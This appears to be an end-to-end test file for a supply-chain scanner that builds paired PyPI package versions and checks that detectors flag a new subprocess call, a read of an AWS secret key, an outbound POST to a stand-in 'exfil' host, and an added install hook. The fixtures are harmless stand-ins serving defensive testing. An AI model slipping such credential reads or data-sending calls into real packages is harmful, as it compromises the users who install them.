import { afterAll, describe, expect, it } from 'vitest';
import { promises as fs } from 'node:fs';
import * as fsSync from 'node:fs';
import { execFile } from 'node:child_process';
import * as path from 'node:path';
import { fileURLToPath } from 'node:url';
import { promisify } from 'node:util';
import { parseLockfileText, runDiff, type RunResult } from '@vetlock/core';
import { runAll } from '@vetlock/detectors';

const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const GENERATED_DIR = path.join(REPO_ROOT, 'assurance', 'test', '.generated-pypi-e2e');
const LOCAL_FIXTURES_DIR = path.join(REPO_ROOT, 'packages', 'core', 'test', 'fixtures', 'pypi');

let artifactCounter = 0;
const execFileAsync = promisify(execFile);

afterAll(async () => {
  await fs.rm(GENERATED_DIR, { recursive: true, force: true });
});

async function maybeUseLocalFixture(pkgName: string, version: string): Promise<string | null> {
  const stem = `${pkgName}-${version}`;
  const candidates = [
    path.join(LOCAL_FIXTURES_DIR, `${stem}.tar.gz`),
    path.join(LOCAL_FIXTURES_DIR, `${stem}.tgz`),
    path.join(LOCAL_FIXTURES_DIR, stem, `${stem}.tar.gz`),
    path.join(LOCAL_FIXTURES_DIR, stem, `${stem}.tgz`),
  ];
  for (const candidate of candidates) {
    if (fsSync.existsSync(candidate)) return candidate;
  }
  return null;
}

async function buildMinimalSdist(
  pkgName: string,
  version: string,
  files: Record<string, string>,
): Promise<string> {
  const fixturePath = await maybeUseLocalFixture(pkgName, version);
  if (fixturePath) return fixturePath;

  const workDir = path.join(
    GENERATED_DIR,
    `${String(artifactCounter++).padStart(2, '0')}-${pkgName}-${version}`,
  );
  const archiveRoot = path.join(workDir, `${pkgName}-${version}`);
  await fs.mkdir(archiveRoot, { recursive: true });

  const mergedFiles: Record<string, string> = {
    'PKG-INFO': `Metadata-Version: 2.1\nName: ${pkgName}\nVersion: ${version}\n`,
    ...files,
  };
  if (!mergedFiles['setup.py'] && !mergedFiles['pyproject.toml']) {
    mergedFiles['setup.py'] =
      `from setuptools import setup\nsetup(name="${pkgName}", version="${version}")\n`;
  }

  for (const [relPath, content] of Object.entries(mergedFiles)) {
    const fullPath = path.join(archiveRoot, relPath);
    await fs.mkdir(path.dirname(fullPath), { recursive: true });
    await fs.writeFile(fullPath, content, 'utf8');
  }

  const tarPath = path.join(workDir, `${pkgName}-${version}.tar.gz`);
  await execFileAsync('tar', ['-czf', tarPath, `${pkgName}-${version}`], { cwd: workDir });
  return tarPath;
}

function makeRequirements(pkgs: Array<{ name: string; version: string }>): string {
  return pkgs.map(({ name, version }) => `${name}==${version}`).join('\n') + '\n';
}

async function runPypiDiff(
  before: string,
  after: string,
  artifacts: Record<string, string>,
): Promise<RunResult> {
  return runDiff(before, after, {
    oldLockfilePath: 'requirements.txt',
    newLockfilePath: 'requirements.txt',
    runDetectors: (pair) => runAll(pair),
    fetchOverride: async (ref) => {
      const artifact = artifacts[`${ref.name}@${ref.version}`];
      if (!artifact) throw new Error(`missing local artifact for ${ref.name}@${ref.version}`);
      return artifact;
    },
  });
}

describe('PyPI end-to-end pipeline', () => {
  it('detects exec.new-module when subprocess is added', async () => {
    const beforeTarball = await buildMinimalSdist('requests-utils', '1.0.0', {
      'requests_utils/__init__.py': 'import requests\n',
    });
    const afterTarball = await buildMinimalSdist('requests-utils', '1.0.1', {
      'requests_utils/__init__.py':
        'import requests\nimport subprocess\nsubprocess.run(["ls"])\n',
    });

    const result = await runPypiDiff(
      makeRequirements([{ name: 'requests-utils', version: '1.0.0' }]),
      makeRequirements([{ name: 'requests-utils', version: '1.0.1' }]),
      {
        'requests-utils@1.0.0': beforeTarball,
        'requests-utils@1.0.1': afterTarball,
      },
    );

    const execFindings = result.findings.filter((f) => f.detector === 'exec.new-module');
    expect(execFindings.length).toBeGreaterThan(0);
    expect(execFindings.every((f) => f.package === 'requests-utils')).toBe(true);
    expect(result.verdict).not.toBe('CLEAN');
  });

  it('detects env.token-harvest when AWS key access is added', async () => {
    const beforeTarball = await buildMinimalSdist('aws-helper', '1.0.0', {
      'aws_helper/__init__.py': 'def load_config():\n    return None\n',
    });
    const afterTarball = await buildMinimalSdist('aws-helper', '1.0.1', {
      'aws_helper/__init__.py':
        'import os\n\ndef load_config():\n    return os.environ.get("AWS_SECRET_ACCESS_KEY")\n',
    });

    const result = await runPypiDiff(
      makeRequirements([{ name: 'aws-helper', version: '1.0.0' }]),
      makeRequirements([{ name: 'aws-helper', version: '1.0.1' }]),
      {
        'aws-helper@1.0.0': beforeTarball,
        'aws-helper@1.0.1': afterTarball,
      },
    );

    const envFindings = result.findings.filter((f) => f.detector === 'env.token-harvest');
    expect(envFindings.length).toBeGreaterThan(0);
    expect(envFindings.every((f) => f.package === 'aws-helper')).toBe(true);
    expect(result.verdict).toBe('BLOCK');
  });

  it('detects net.new-endpoint when an exfil URL is added', async () => {
    const beforeTarball = await buildMinimalSdist('telemetry-client', '1.0.0', {
      'telemetry_client/__init__.py': 'import requests\n',
    });
    const afterTarball = await buildMinimalSdist('telemetry-client', '1.0.1', {
      'telemetry_client/__init__.py':
        'import requests\nrequests.post("https://example.invalid/collect", json={"status": "ok"})\n',
    });

    const result = await runPypiDiff(
      makeRequirements([{ name: 'telemetry-client', version: '1.0.0' }]),
      makeRequirements([{ name: 'telemetry-client', version: '1.0.1' }]),
      {
        'telemetry-client@1.0.0': beforeTarball,
        'telemetry-client@1.0.1': afterTarball,
      },
    );

    const netFindings = result.findings.filter((f) => f.detector === 'net.new-endpoint');
    expect(netFindings.length).toBeGreaterThan(0);
    expect(netFindings.every((f) => f.package === 'telemetry-client')).toBe(true);
    expect(result.verdict).not.toBe('CLEAN');
  });

  it('detects install.script-added when setup.py cmdclass is added', async () => {
    const beforeTarball = await buildMinimalSdist('setup-hook', '1.0.0', {
      'setup.py': 'from setuptools import setup\nsetup(name="setup-hook", version="1.0.0")\n',
      'setup_hook/__init__.py': '__version__ = "1.0.0"\n',
    });
    const afterTarball = await buildMinimalSdist('setup-hook', '1.0.1', {
      'setup.py':
        'from setuptools import setup\n' +
        'from setuptools.command.install import install as _install\n\n' +
        'class PostInstall(_install):\n' +
        '    def run(self):\n' +
        '        return _install.run(self)\n\n' +
        'setup(name="setup-hook", version="1.0.1", cmdclass={"install": PostInstall})\n',
      'setup_hook/__init__.py': '__version__ = "1.0.1"\n',
    });

    const result = await runPypiDiff(
      makeRequirements([{ name: 'setup-hook', version: '1.0.0' }]),
      makeRequirements([{ name: 'setup-hook', version: '1.0.1' }]),
      {
        'setup-hook@1.0.0': beforeTarball,
        'setup-hook@1.0.1': afterTarball,
      },
    );

    const installFindings = result.findings.filter((f) => f.detector === 'install.script-added');
    expect(installFindings.length).toBeGreaterThan(0);
    expect(installFindings.every((f) => f.package === 'setup-hook')).toBe(true);
    expect(result.verdict).toBe('BLOCK');
  });

  it('returns CLEAN on a benign bump', async () => {
    const beforeTarball = await buildMinimalSdist('benign-docs', '1.0.0', {
      'benign_docs/__init__.py': 'VERSION = "1.0.0"\n',
      'README.md': '# benign-docs\n',
    });
    const afterTarball = await buildMinimalSdist('benign-docs', '1.0.1', {
      'benign_docs/__init__.py': 'VERSION = "1.0.1"\n# docs update\n',
      'README.md': '# benign-docs\n\nDocumentation refresh.\n',
    });

    const result = await runPypiDiff(
      makeRequirements([{ name: 'benign-docs', version: '1.0.0' }]),
      makeRequirements([{ name: 'benign-docs', version: '1.0.1' }]),
      {
        'benign-docs@1.0.0': beforeTarball,
        'benign-docs@1.0.1': afterTarball,
      },
    );

    expect(result.findings).toHaveLength(0);
    expect(result.verdict).toBe('CLEAN');
  });

  it('correctly identifies ecosystem as pypi', () => {
    const result = parseLockfileText(
      makeRequirements([{ name: 'requests', version: '2.31.0' }]),
      'requirements.txt',
    );
    expect(result.ecosystem).toBe('pypi');
    expect(result.kind).toBe('pypi-requirements');
  });
});
